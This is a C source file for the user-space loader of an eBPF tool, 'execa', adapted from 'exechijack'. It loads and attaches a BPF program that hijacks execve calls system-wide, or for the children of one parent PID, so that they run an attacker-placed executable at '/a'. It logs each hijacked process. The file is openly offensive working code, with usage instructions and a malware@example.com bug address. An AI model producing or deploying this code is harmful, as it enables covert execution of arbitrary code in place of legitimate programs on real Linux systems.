/* SPDX-License-Identifier: BSD-3-Clause
 *
 * Adapted from: Pat Hogan @pathtofile, "exechijack"
 */

#include "execa.skel.h"

#include <argp.h>
#include <unistd.h>
#include "execa_user.h"
#include "execa_common.h"

// setup argument stuff
static struct env {
  int pid_to_hide;
  int target_ppid;
} env;

const char* argp_program_version = "execa v0.0";
const char* argp_program_bug_address = "<malware@example.com>";
const char argp_program_doc[] = "Exec 'a'\n"
				"\n"
				"Hijacks all calls to execve to instead run program '/a'\n"
				"\n"
				"USAGE: First put any executable or script at '/a'. \n"
				"       (probably best to make it executable by everyone)\n"
				"Then run: ./exechijack [-t <PID>]\n";

static const struct argp_option opts[] = {
  { "target-ppid",
      't',
      "PPID",
      0,
      "Optional Parent PID, will only affect its children." },
  {},
};

static error_t parse_arg(int key, char* arg, struct argp_state* state)
{
  switch (key) {
  case 't':
    errno = 0;
    env.target_ppid = strtol(arg, NULL, 10);
    if (errno || env.target_ppid <= 0) {
      fprintf(stderr, "parse_arg: error: invalid "
	  "pid: %s\n", arg);
      argp_usage(state);
    }
    break;
  case ARGP_KEY_ARG:
    argp_usage(state);
    break;
  default:
    return ARGP_ERR_UNKNOWN;
  }
  return 0;
}

static const struct argp argp = {
  .options = opts,
  .parser = parse_arg,
  .doc = argp_program_doc,
};

static int handle_event(void* ctx, void* data, size_t data_sz)
{
  const struct event* e = data;
  if (e->success)
    printf("handle_event: hijacked PID %d to run "
	"'/a' instead of '%s'\n", e->pid, e->comm);
  else
    printf("handle_event: failed to hijack PID %d "
	"to run '/a' instead of '%s'\n", e->pid, e->comm);
  return 0;
}

int main(int argc, char** argv)
{
  struct ring_buffer* rb = NULL;
  struct execa_bpf* skel = NULL;
  int err = 0;

  // parse command line arguments
  err = argp_parse(&argp, argc, argv, 0, NULL,
      NULL);
  if (err) {
    return err;
  }

  // do common setup
  if (!setup()) {
    exit(1);
  }

  // check the hijackee file exists
  const char* hijackee_filename = "/a";
  if (access(hijackee_filename, F_OK) != 0) {
    fprintf(stderr, "main: error: make sure there is an "
		    "executable file located at '%s' \n",
	hijackee_filename);
    exit(1);
  }

  // open BPF application
  skel = execa_bpf__open();
  if (!skel) {
    fprintf(stderr, "main: error: failed to open BPF"
	" program: %s\n",
	strerror(errno));
    return 1;
  }

  // set target pid if using
  skel->rodata->target_ppid = env.target_ppid;

  // verify and load program
  err = execa_bpf__load(skel);
  if (err) {
    fprintf(stderr, "main: error: failed to load and "
	"verify BPF skeleton\n");
    goto cleanup;
  }

  // attach tracepoint handler
  err = execa_bpf__attach(skel);
  if (err) {
    fprintf(stderr, "main: error: failed to attach "
	"BPF program: %s\n", strerror(errno));
    goto cleanup;
  }

  // set up ring buffer
  rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL,
      NULL);
  if (!rb) {
    err = -1;
    fprintf(stderr, "main: error: failed to create "
	"ring buffer\n");
    goto cleanup;
  }

  printf("Successfully started!\n");
  printf("Hijacking execve to run '/a' instead\n");
  printf("Debug output: cat /sys/kernel/debug/tracing/trace_pipe\n");
  while (!exiting) {
    err = ring_buffer__poll(rb, 100 /* timeout, ms */);
    /* Ctrl-C will cause -EINTR */
    if (err == -EINTR) {
      err = 0;
      break;
    }
    if (err < 0) {
      printf("main: error: polling perf buffer: %d\n", err);
      break;
    }
  }

cleanup:
  execa_bpf__destroy(skel);
  return -err;
}
